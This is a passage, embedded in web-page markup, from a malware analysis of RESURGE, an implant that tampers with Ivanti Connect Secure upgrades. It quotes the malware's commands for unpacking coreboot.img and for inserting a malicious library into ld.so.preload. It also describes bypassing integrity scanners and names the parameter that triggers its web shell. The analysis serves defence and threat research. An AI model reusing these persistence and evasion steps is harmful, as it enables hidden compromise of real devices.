+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16V80a16 16 0 0 0-16-16zm0 320H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zM16 160h64a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H64V40a8 8 0 0 0-8-8H32a8 8 0 0 0-7.14 4.42l-8 16A8 8 0 0 0 24 64h8v64H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8zm-3.91 160H80a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44 0-29.06-25-39.56-44.47-39.56-21.36 0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44 0 0 1 9.46-3.84c3.33 0 9.28 1.56 9.28 8.75C51 248.19 0 257.31 0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
+
+      <button 
+        class="
+          wrap-code-button
+          tw-select-none 
+          tw-mx-2 
+          tw-hidden 
+          group-[.is-open]:tw-block 
+          group-[.is-wrap]:tw-text-fgColor-link 
+          print:!tw-hidden" 
+        title="Toggle code wrap"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
+      
+      <button 
+        class="
+          copy-code-button
+          tw-select-none
+          tw-mx-2 
+          tw-hidden
+          group-[.is-open]:tw-block
+          hover:tw-text-fgColor-link 
+          print:!tw-hidden"
+        title="Copy code">
+          <span class="copy-icon tw-block"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M433.941 65.941l-51.882-51.882A48 48 0 0 0 348.118 0H176c-26.51 0-48 21.49-48 48v48H48c-26.51 0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51 0 48-21.49 48-48v-48h80c26.51 0 48-21.49 48-48V99.882a48 48 0 0 0-14.059-33.941zM266 464H54a6 6 0 0 1-6-6V150a6 6 0 0 1 6-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 0 1-6 6zm128-96H182a6 6 0 0 1-6-6V54a6 6 0 0 1 6-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 0 1-6 6zm6-256h-64V48h9.632c1.591 0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 0 1 1.757 4.243V112z"/></svg></span>
+          <span class="check-icon tw-hidden"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
+      </button>
+        
+      <button 
+        class="
+          tw-select-none 
+          tw-mx-2 
+          tw-block 
+          group-[.is-open]:tw-hidden 
+          print:!tw-hidden" 
+        disabled
+        aria-hidden="true"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button>
+    </div>
+  </div>
+  <pre style="counter-reset: codeblock;" class="tw-block tw-m-0 tw-p-0"><code 
+    id="codeblock-id-2" 
+    class="
+      chroma 
+      !tw-block 
+      tw-p-0
+      tw-m-0
+      tw-transition-[max-height] 
+      tw-duration-500 
+      tw-ease-in-out 
+      group-[.is-closed]:!tw-max-h-0 
+      group-[.is-wrap]:tw-text-wrap
+      tw-overflow-y-hidden
+      tw-overflow-x-auto
+      tw-scrollbar-thin
+      "><span class="line"><span class="cl">gunzip /tmp/new_img/coreboot.img.1.gz
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /tmp/coreboot_fs
+</span></span><span class="line"><span class="cl">cpio -idvm &lt; /tmp/new_img/coreboot.img.1</span></span></code></pre>
+</div>
+</li>
+<li><strong>Lines 28-30:</strong> RESURGE&rsquo;s components are copied into this extracted filesystem:
+<ul>
+<li>The <code>dsmain</code> binary itself.</li>
+<li>The malicious shared object <code>libdsupgrade.so</code>.</li>
+<li>The helper Python egg.
+These are typically placed into locations like <code>/bin/</code> and <code>/lib/</code> within <code>/tmp/coreboot_fs</code>.</li>
+</ul>
+</li>
+<li><strong>Lines 31-33:</strong> <code>dsmain sed -i '1i/lib/libdsupgrade.so' /home/root/etc/ld.so.preload</code> (Note: path inside <code>coreboot.img</code>&rsquo;s filesystem might be different, e.g., <code>/etc/ld.so.preload</code> or a path relative to the <code>coreboot_fs</code> root like <code>./etc/ld.so.preload</code>).
+<ul>
+<li>Crucially, RESURGE modifies the <code>ld.so.preload</code> file <em>within</em> the <code>coreboot.img</code> filesystem. This ensures that <code>libdsupgrade.so</code> is preloaded very early in the boot process when <code>coreboot.img</code> is active, providing an extremely deep and resilient form of persistence.</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li><strong>Repackaging and Re-encryption (Lines 34-37):</strong></li>
+</ol>
+<ul>
+<li>The modified <code>/tmp/coreboot_fs</code> directory is then:
+<ul>
+<li>Repacked into a CPIO archive.</li>
+<li>Compressed using gzip.</li>
+<li>Re-encrypted using <code>dsmain -e</code> with the previously extracted AES key.</li>
+</ul>
+</li>
+<li>This newly created, malicious <code>coreboot.img</code> then replaces the legitimate one in the upgrade package, ensuring it gets installed.</li>
+</ul>
+</li>
+</ol>
+<h2 id="additional-modifications-by-resurge" class="headerLink">
+    <a href="#additional-modifications-by-resurge" class="header-mark"></a>Additional Modifications by RESURGE</h2><p>RESURGE includes a few other subtle modifications:</p>
+<ul>
+<li><strong>Wrapper Package Path Correction:</strong> A SED one-liner adjusts paths, likely to ensure correct <code>LD_PRELOAD</code> inheritance or script execution context when updates are applied via &ldquo;wrapper&rdquo; packages (packages that bundle other packages).</li>
+<li><strong>Scanner Bypass (Preemptive):</strong> If <code>bom_files</code> (Bill of Materials files, often used for integrity checking or file listing) exist, RESURGE uses SED commands to neutralize Python-based scanners. This likely involves modifying scanner scripts to ignore RESURGE&rsquo;s files or always return success, similar to the <code>check_integrity.sh</code> bypass.</li>
+</ul>
+<h2 id="impact-of-compromise" class="headerLink">
+    <a href="#impact-of-compromise" class="header-mark"></a>Impact of Compromise</h2><p>Once RESURGE has successfully manipulated the upgrade process, the Ivanti Connect Secure appliance is deeply compromised:</p>
+<ul>
+<li>The primary implant, <code>/lib/libdsupgrade.so</code>, is loaded broadly across the system via the tampered <code>/etc/ld.so.preload</code> in the main filesystem.</li>
+<li>If <code>coreboot.img</code> was also targeted, <code>libdsupgrade.so</code> is also loaded from within the <code>coreboot.img</code> environment during early boot stages, providing an additional layer of persistence that is very difficult to remove without a full, trusted re-imaging.</li>
+<li>Command and Control (C2) is established. My reverse engineering identified an RC4-encrypted C2 channel initiated through constructor hooks in <code>libdsupgrade.so</code>. CISA also notes that RESURGE can establish SSH tunnels for C2.</li>
+<li>The injected Perl snippet in <code>compcheckresult.cgi</code> provides a persistent web shell accessible via the <code>vXm8DtMJG</code> parameter, allowing unauthenticated remote command execution.</li>
+<li>System integrity checking tools are neutered, allowing the malware to operate undetected by standard checks.</li>
+</ul>
+<p>The modification of <code>coreboot.img</code>, as highlighted by CISA, offers significant persistence. This technique is designed to survive typical remediation efforts like factory resets (if the reset doesn&rsquo;t re-flash <code>coreboot</code> from a trusted source) and standard upgrade procedures (which RESURGE will simply re-infect).</p>
+<p>This deep entrenchment underscores the sophistication of the threat actors targeting edge infrastructure devices and the critical need for robust firmware and software supply chain security, as well as advanced detection and response capabilities.</p>
+<hr>
 </div></div></main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
                     Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.147.3">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.2"><svg class="icon"
